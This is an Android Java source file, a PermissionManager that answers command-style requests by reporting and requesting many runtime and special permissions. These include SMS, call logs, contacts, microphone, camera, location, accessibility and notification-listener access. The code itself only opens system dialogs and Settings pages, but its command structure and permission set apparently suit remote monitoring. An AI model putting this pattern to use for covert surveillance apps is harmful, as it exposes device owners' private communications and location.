package com.task.tusker.commands;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.task.tusker.PermissionRequestActivity;
import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * PermissionManager — queries and requests runtime permissions.
 *
 * Commands:
 *   get_permissions         → returns list of all permissions with granted/denied status
 *   request_permission      → shows native dialog for standard permissions; opens the
 *                             correct Settings page for special permissions
 *   request_all_permissions → shows native dialog for all currently-denied standard
 *                             permissions in one shot
 */
public class PermissionManager {

    private static final String TAG = "PermissionManager";
    private final Context context;

    /** All permissions reported in the dashboard — ordered, with friendly labels. */
    private static final Map<String, String> ALL_PERMISSIONS = new LinkedHashMap<String, String>() {{
        put(Manifest.permission.CAMERA,                          "Camera");
        put(Manifest.permission.RECORD_AUDIO,                   "Microphone / Record Audio");
        put(Manifest.permission.ACCESS_FINE_LOCATION,           "Fine Location (GPS)");
        put(Manifest.permission.ACCESS_COARSE_LOCATION,         "Coarse Location (Network)");
        put(Manifest.permission.READ_CONTACTS,                  "Read Contacts");
        put(Manifest.permission.READ_SMS,                       "Read SMS");
        put(Manifest.permission.SEND_SMS,                       "Send SMS");
        put(Manifest.permission.RECEIVE_SMS,                    "Receive SMS");
        put(Manifest.permission.READ_CALL_LOG,                  "Read Call Logs");
        put(Manifest.permission.READ_EXTERNAL_STORAGE,          "Read External Storage");
        put(Manifest.permission.WRITE_EXTERNAL_STORAGE,         "Write External Storage");
        put(Manifest.permission.READ_MEDIA_IMAGES,              "Read Media Images");
        put(Manifest.permission.READ_MEDIA_VIDEO,               "Read Media Video");
        put(Manifest.permission.READ_MEDIA_AUDIO,               "Read Media Audio");
        put(Manifest.permission.ACCESS_WIFI_STATE,              "Access WiFi State");
        put(Manifest.permission.CHANGE_WIFI_STATE,              "Change WiFi State");
        put(Manifest.permission.VIBRATE,                        "Vibrate");
        put(Manifest.permission.WAKE_LOCK,                      "Wake Lock");
        put(Manifest.permission.RECEIVE_BOOT_COMPLETED,         "Receive Boot Completed");
        put(Manifest.permission.INTERNET,                       "Internet");
        put(Manifest.permission.ACCESS_NETWORK_STATE,           "Access Network State");
        put("android.permission.POST_NOTIFICATIONS",            "Post Notifications (Android 13+)");
        put("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE", "Notification Listener");
        put("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "Ignore Battery Optimizations");
    }};

    /**
     * Permissions that CANNOT be granted through the native runtime-permission dialog.
     * These require dedicated Settings pages and are handled by buildSettingsIntent().
     */
    private static final Set<String> SETTINGS_ONLY_PERMISSIONS = new HashSet<>(Arrays.asList(
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.PACKAGE_USAGE_STATS",
            "android.permission.WRITE_SETTINGS",
            "android.permission.SYSTEM_ALERT_WINDOW"
    ));

    public PermissionManager(Context context) {
        this.context = context.getApplicationContext();
    }

    /** Returns all permissions with granted/denied status. */
    public JSONObject getPermissions() {
        JSONObject result = new JSONObject();
        try {
            JSONArray granted    = new JSONArray();
            JSONArray notGranted = new JSONArray();

            for (Map.Entry<String, String> entry : ALL_PERMISSIONS.entrySet()) {
                String permission = entry.getKey();
                String label      = entry.getValue();
                boolean isGranted = checkPermission(permission);

                JSONObject item = new JSONObject();
                item.put("permission", permission);
                item.put("label", label);
                item.put("granted", isGranted);

                if (isGranted) granted.put(item);
                else           notGranted.put(item);
            }

            boolean accessibilityGranted =
                    com.task.tusker.services.UnifiedAccessibilityService.getInstance() != null;
            JSONObject accessItem = new JSONObject();
            accessItem.put("permission", "android.permission.BIND_ACCESSIBILITY_SERVICE");
            accessItem.put("label", "Accessibility Service");
            accessItem.put("granted", accessibilityGranted);
            if (accessibilityGranted) granted.put(accessItem);
            else                      notGranted.put(accessItem);

            result.put("success",        true);
            result.put("granted",        granted);
            result.put("notGranted",     notGranted);
            result.put("grantedCount",   granted.length());
            result.put("notGrantedCount",notGranted.length());
            result.put("totalCount",     granted.length() + notGranted.length());

        } catch (Exception e) {
            Log.e(TAG, "getPermissions error: " + e.getMessage());
            try { result.put("success", false); result.put("error", e.getMessage()); }
            catch (Exception ignored) {}
        }
        return result;
    }

    private boolean checkPermission(String permission) {
        try {
            return ContextCompat.checkSelfPermission(context, permission)
                    == PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Request a single permission.
     *
     * - Standard runtime permissions  → launch PermissionRequestActivity which shows
     *   the native OS dialog.  If the user had previously ticked "Don't ask again",
     *   the activity automatically falls back to App Info settings.
     * - Special permissions           → open the exact Settings page for that permission.
     */
    public JSONObject requestPermission(String permission) {
        JSONObject result = new JSONObject();
        try {
            Intent intent;
            if (SETTINGS_ONLY_PERMISSIONS.contains(permission)) {
                intent = buildSettingsIntent(permission);
            } else {
                // Standard runtime permission — use the transparent trampoline activity.
                intent = new Intent(context, PermissionRequestActivity.class);
                intent.putExtra(PermissionRequestActivity.EXTRA_PERMISSION, permission);
            }

            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                result.put("success", true);
                result.put("message", "Permission dialog shown for: " + permission);
            } else {
                result.put("success", false);
                result.put("error", "Cannot handle this permission on this API level");
            }

        } catch (Exception e) {
            Log.e(TAG, "requestPermission error: " + e.getMessage());
            try { result.put("success", false); result.put("error", e.getMessage()); }
            catch (Exception ignored) {}
        }
        return result;
    }

    /**
     * Request ALL currently-denied standard runtime permissions in one dialog sequence.
     * Special/settings-only permissions are skipped (they need manual Settings navigation).
     */
    public JSONObject requestAllPermissions() {
        JSONObject result = new JSONObject();
        try {
            List<String> missing = new ArrayList<>();
            for (String perm : ALL_PERMISSIONS.keySet()) {
                if (!checkPermission(perm) && !SETTINGS_ONLY_PERMISSIONS.contains(perm)) {
                    missing.add(perm);
                }
            }

            if (!missing.isEmpty()) {
                Intent intent = new Intent(context, PermissionRequestActivity.class);
                intent.putExtra(PermissionRequestActivity.EXTRA_PERMISSIONS,
                        missing.toArray(new String[0]));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                result.put("success", true);
                result.put("message", "Showing permission dialog for " + missing.size()
                        + " missing permission(s)");
            } else {
                // All standard permissions already granted — open app settings for reference.
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                result.put("success", true);
                result.put("message",
                        "All standard permissions already granted — opened App Info for reference");
            }

        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); }
            catch (Exception ignored) {}
        }
        return result;
    }

    /**
     * Builds the exact Settings Intent for permissions that cannot use the
     * native runtime-permission dialog (settings-only permissions).
     */
    private Intent buildSettingsIntent(String permission) {
        String pkg = context.getPackageName();
        Intent intent = null;

        switch (permission) {
            case "android.permission.BIND_ACCESSIBILITY_SERVICE":
                intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                break;

            case "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE":
                intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                break;

            case "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    android.os.PowerManager pm =
                            (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
                    if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
                        // Show the direct "Disable battery optimization?" dialog for this app.
                        intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                Uri.parse("package:" + pkg));
                    } else {
                        intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                    }
                }
                break;

            case "android.permission.PACKAGE_USAGE_STATS":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                }
                break;

            case "android.permission.WRITE_SETTINGS":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                            Uri.parse("package:" + pkg));
                }
                break;

            case "android.permission.SYSTEM_ALERT_WINDOW":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + pkg));
                }
                break;

            default:
                // Fallback — open generic App Info page.
                intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.parse("package:" + pkg));
                break;
        }

        return intent;
    }
}
